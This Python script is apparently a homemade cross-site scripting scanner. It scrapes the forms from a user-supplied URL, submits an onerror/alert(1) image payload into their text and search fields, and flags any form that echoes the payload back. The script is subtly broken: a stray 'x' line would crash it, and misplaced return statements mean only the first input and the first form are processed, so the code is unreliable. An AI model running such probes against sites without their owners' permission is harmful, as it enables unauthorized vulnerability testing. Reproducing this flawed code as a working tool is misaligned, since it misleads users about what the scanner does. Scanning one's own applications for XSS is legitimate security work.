#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Wed Nov 11 13:22:10 2020

@author: fr3qu3n533
"""


import requests
from pprint import pprint
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin

'''
Since this type of web vulnerabilities are exploited in user inputs and 
forms, as a result, 
we need to fill out any form we see by some javascript code. So, let's 
first make a function to get all the forms from the HTML content of any web page 
'''

def fetch_all_forms(url):
    """Given a `URL`, it returns all forms from the HTML content"""
    soup=bs(requests.get(url).content,"html.parser")
    return soup.find_all("form")

def fetch_form_details(form):
    """
    This function extracts all possible useful information about HTML forms
    """
    details={}
    #get the form actions(target url)
    action=form.attrs.get("action").lower()
    #get the form method(POST,GET, etc.)
    method=form.attrs.get("method","get").lower()
    # get all the input detials such as type and name
    inputs=[]
    for input_tag in form.find_all("input"):
        input_type=input_tag.attrs.get("type","text")
        input_name=input_tag.attrs.get("name")
        inputs.append({"type":input_type,"name": input_name})
        
    details["action"]= action
    details["method"]= method
    details["inputs"]= inputs
    return details

def submit_form(form_details,url,value):
    """
    Submits a form from the `form_details`
    
    Parameters
    ----------
    form_details : a dictionary that contain form information
    url : the origial URL that contain that form 
    value : this will be replaced to all text and search inputs

    Returns
    -------
    Returns the HTTP response after form submission
    """
    # construct  the full URL(if the url provided in action is relative)
    target_url=urljoin(url,form_details["action"])
    #get the inputs
    inputs=form_details["inputs"]
    data={}
    for input in inputs:
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
            
        input_name=input.get("name")
        input_value=input.get("value")
        if input_name and input_value:
            #if input name and input value are not NONE,
            # then add them to the data of form submission
            data[input_name]=input_value
        if form_details["method"] == "post":
            return requests.post(target_url,data=data)
        else:
            # GET request
            return requests.get(target_url,params=data)
        
def scan_xss(url):
    """
    

    Parameters
    ----------
    url : Given user provided URL, the site returns all the vulnerable forms and
    

    Returns
    -------
    returns true if any of those are vulnerable.

    """
    forms=fetch_all_forms(url)
    print(f"[+]Detected{len(forms)} forms on {url}.")
    js_script='<img src=1 href=1 onerror="javascript:alert(1)"></img>'
    
    #returning value
    is_vulnerable=False
    x
    # iterate over all forms
    
    for form in forms:
        form_details = fetch_form_details(form)
        content = submit_form(form_details, url, js_script).content.decode()
        if js_script in content:
            print(f"[+] XSS Detected on {url}")
            print(f"[*] Form details:")
            pprint(form_details)
            is_vulnerable=True
            # won't break because we want to print available vulnerable forms
        return is_vulnerable
    
if __name__=="__main__":
    url=input("Enter the domain: ")
    print(scan_xss(url))
